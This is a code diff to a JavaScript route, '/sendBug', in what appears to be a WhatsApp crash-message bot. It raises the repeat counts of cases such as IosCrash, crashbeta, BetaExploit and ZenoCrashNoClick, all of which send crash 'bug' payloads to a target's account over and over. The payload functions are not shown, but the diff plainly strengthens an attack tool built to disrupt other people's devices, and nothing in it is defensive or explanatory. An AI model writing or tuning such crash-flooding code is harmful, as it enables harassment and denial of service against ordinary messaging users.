@@ -318,7 +318,7 @@ router.get("/sendBug", async (req, res) => {
 
         // ── BUGS ──
         case "AhhCrot":
-          for (let i = 0; i < 77; i++) {
+          for (let i = 0; i < 200; i++) {
             await AhhCrot(sock, targetJid);
             await sleep(1500);
             await bleng(sock, targetJid);
@@ -329,7 +329,7 @@ router.get("/sendBug", async (req, res) => {
           break;
 
         case "bleng":
-          for (let i = 0; i < 25; i++) {
+          for (let i = 0; i < 205; i++) {
             await bleng(sock, targetJid);
             await sleep(1200);
             await AhhCrot(sock, targetJid);
@@ -338,7 +338,7 @@ router.get("/sendBug", async (req, res) => {
           break;
 
         case "denglay":
-          for (let i = 0; i < 88; i++) {
+          for (let i = 0; i < 100; i++) {
             await denglay(sock, targetJid);
             await sleep(1500);
             await tesss(sock, targetJid);
@@ -351,7 +351,7 @@ router.get("/sendBug", async (req, res) => {
           break;
 
         case "blankmsg":
-          for (let i = 0; i < 77; i++) {
+          for (let i = 0; i < 88; i++) {
             await blankmsg(sock, targetJid);
             await sleep(1500);
             await R9X(sock, targetJid);
@@ -364,7 +364,7 @@ router.get("/sendBug", async (req, res) => {
           break;
 
         case "crashbeta":
-          for (let i = 0; i < 66; i++) {
+          for (let i = 0; i < 96; i++) {
             await crashbeta(sock, targetJid);
             await sleep(1500);
             await crashfcnewxryy(sock, targetJid);
@@ -375,7 +375,7 @@ router.get("/sendBug", async (req, res) => {
           }
           break;
           case "MarkNyawit":
-          for (let i = 0; i < 60; i++) {
+          for (let i = 0; i < 160; i++) {
             await MarkNyawit(sock, targetJid);
             await sleep(1500);
             await Nyawit(sock, targetJid);
@@ -385,7 +385,7 @@ router.get("/sendBug", async (req, res) => {
           }
           break;
           case "IosCrash":
-          for (let i = 0; i < 30; i++) {
+          for (let i = 0; i < 130; i++) {
             await IosCrash(sock, targetJid);
             await sleep(1500);
             await AhhCrot(sock, targetJid);
@@ -393,7 +393,7 @@ router.get("/sendBug", async (req, res) => {
           }
           break;
           case "crashfcnewxryy":
-          for (let i = 0; i < 15; i++) {
+          for (let i = 0; i < 115; i++) {
             await BetaExploit(sock, targetJid);
             await sleep(1500);
             await ZenoCrashNoClick(sock, targetJid);
@@ -406,7 +406,7 @@ router.get("/sendBug", async (req, res) => {
         // ── payload ──
         
         case "bleng":
-          for (let i = 0; i < 30; i++) {
+          for (let i = 0; i < 300; i++) {
             await bleng(sock, targetJid);
             await sleep(1200);
             await AhhCrot(sock, targetJid);
@@ -417,7 +417,7 @@ router.get("/sendBug", async (req, res) => {
           break;
 
         case "epcinjir":
-          for (let i = 0; i < 30; i++) {
+          for (let i = 0; i < 310; i++) {
             await epcinjir(sock, targetJid);
             await sleep(1200);
             await AhhCrot(sock, targetJid);
@@ -426,7 +426,7 @@ router.get("/sendBug", async (req, res) => {
           break;
 
         case "BuritMambu":
-          for (let i = 0; i < 20; i++) {
+          for (let i = 0; i < 120; i++) {
             await BuritMambu(sock, targetJid);
             await sleep(1200);
             await AhhCrot(sock, targetJid);
@@ -435,7 +435,7 @@ router.get("/sendBug", async (req, res) => {
           break;
 
         case "ZenoCrashNoClick":
-          for (let i = 0; i < 30; i++) {
+          for (let i = 0; i < 130; i++) {
             await ZenoCrashNoClick(sock, targetJid);
             await sleep(1500);
             await AhhCrot(sock, targetJid);
